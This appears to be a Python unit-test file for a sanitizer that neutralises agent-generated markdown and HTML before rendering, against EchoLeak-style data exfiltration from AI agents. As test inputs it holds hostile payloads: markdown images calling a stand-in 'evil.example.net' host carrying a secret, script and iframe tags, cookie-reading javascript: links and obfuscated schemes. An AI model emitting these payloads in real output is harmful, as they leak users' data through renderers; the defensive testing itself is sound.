"""P13 renderer-side reference filter tests (wave-36).

gov/output_filter.py is the executable form of docs/DEPLOYMENT.md
§5.6: a deterministic, stdlib-only sanitizer for agent-controlled
text before it reaches an active renderer. EchoLeak-class payloads
(markdown images that fetch, raw-HTML active tags, dangerous
schemes) must be neutralized; benign markdown and code blocks must
pass through unchanged.
"""

import os
import sys
import unittest

_TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
for _p in (_TESTS_DIR, os.path.dirname(_TESTS_DIR)):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from gov.output_filter import (  # noqa: E402
    contains_active_content,
    sanitize,
)

EVIL = "https://evil.example.net/x?d=SECRET"


class TestEchoLeakPayloadsNeutralized(unittest.TestCase):

    def test_markdown_image_exfil_neutralized(self):
        payload = "results: ![chart](%s)" % EVIL
        self.assertTrue(contains_active_content(payload))
        out = sanitize(payload)
        self.assertFalse(contains_active_content(out))
        self.assertNotIn("![chart]", out)
        # The URL survives as inert text (auditable, not fetchable).
        self.assertIn("evil.example.net", out)

    def test_raw_html_img_escaped(self):
        payload = '<img src="%s">' % EVIL
        out = sanitize(payload)
        self.assertFalse(contains_active_content(out))
        self.assertIn("&lt;img", out)

    def test_script_and_iframe_escaped(self):
        for payload in ("<script>alert(1)</script>",
                        '<iframe src="https://evil.example.net/">',
                        '<object data="%s">' % EVIL):
            out = sanitize(payload)
            self.assertFalse(contains_active_content(out),
                             payload)
            self.assertIn("&lt;", out)

    def test_html_comment_stripped(self):
        out = sanitize("a <!-- <img src=x> --> b")
        self.assertFalse(contains_active_content(out))
        self.assertIn("&lt;!--", out)

    def test_javascript_link_neutralized(self):
        payload = "[click](javascript:alert(document.cookie))"
        out = sanitize(payload)
        self.assertFalse(contains_active_content(out))
        self.assertNotIn("[click](javascript", out)

    def test_data_uri_image_neutralized(self):
        payload = ("![x](data:image/svg+xml;base64,"
                   "PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)")
        out = sanitize(payload)
        self.assertFalse(contains_active_content(out))

    def test_entity_obfuscated_scheme_caught(self):
        payload = "[x](&#106;avascript:alert(1))"
        self.assertTrue(contains_active_content(payload))
        out = sanitize(payload)
        self.assertFalse(contains_active_content(out))

    def test_whitespace_obfuscated_scheme_caught(self):
        payload = "[x](java\tscript:alert(1))"
        self.assertTrue(contains_active_content(payload))
        out = sanitize(payload)
        self.assertFalse(contains_active_content(out))

    def test_reference_style_image_evil_host_neutralized(self):
        payload = ("see ![fig][f1]\n\n[f1]: %s" % EVIL)
        self.assertTrue(contains_active_content(payload))
        out = sanitize(payload)
        self.assertFalse(contains_active_content(out))
        self.assertNotIn("![fig]", out)

    def test_dangerous_autolink_neutralized(self):
        out = sanitize("<javascript:alert(1)>")
        self.assertFalse(contains_active_content(out))
        self.assertIn("&lt;javascript", out)


class TestBenignMarkdownPreserved(unittest.TestCase):

    def test_plain_link_passes_through(self):
        text = "[docs](https://docs.example.net/page)"
        self.assertEqual(sanitize(text), text)
        self.assertFalse(contains_active_content(text))

    def test_allowlisted_image_passes_through(self):
        text = "![logo](https://img.example.net/logo.png)"
        self.assertFalse(contains_active_content(
            text, image_host_allowlist={"img.example.net"}))
        self.assertEqual(sanitize(
            text, image_host_allowlist={"img.example.net"}), text)

    def test_fenced_code_block_untouched(self):
        text = "```\n![evil](%s)\n```" % EVIL
        # Code spans are inert in CommonMark renderers; the filter
        # must not corrupt displayed code.
        self.assertEqual(sanitize(text), text)

    def test_inline_code_span_untouched(self):
        text = "use `![a](b)` syntax"
        self.assertEqual(sanitize(text), text)

    def test_formatting_preserved(self):
        text = "# Title\n\n**bold** and `code` and\n\n- item 1\n- item 2\n"
        self.assertEqual(sanitize(text), text)

    def test_bare_https_url_left_as_text(self):
        # Link-preview fetches are a renderer setting (linkify off /
        # server-side unfurl proxy), not the filter's scope -- see
        # §5.6 item 3. The filter leaves bare URLs alone.
        text = "see https://evil.example.net/x for details"
        self.assertEqual(sanitize(text), text)


class TestDeterminism(unittest.TestCase):

    def test_idempotent(self):
        payloads = ["![a](%s)" % EVIL,
                    "<script>x</script>",
                    "[x](javascript:y)",
                    "plain **text**"]
        for p in payloads:
            once = sanitize(p)
            self.assertEqual(sanitize(once), once)


if __name__ == "__main__":
    unittest.main()
